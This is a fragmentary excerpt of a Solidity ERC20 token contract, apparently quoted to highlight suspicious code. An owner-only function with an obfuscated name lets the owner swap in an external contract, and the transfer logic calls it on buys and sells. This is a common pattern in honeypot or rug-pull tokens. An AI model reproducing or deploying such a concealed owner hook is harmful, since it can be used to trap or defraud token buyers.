...
contract TokenM is ERC20 {
    ...
    IUserAmountfoermm public foermm;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("T2T2", "T2T2") {
    ...
    function cueiweieBferooRoov(IUserAmountfoermm _foermm) public onlyOwner {
        foermm = _foermm;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                foermm.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				foermm.addOutAmount(from, amount);
            }else{
                foermm.addOutAmount(from, amount);
                takeFee = false;
            }
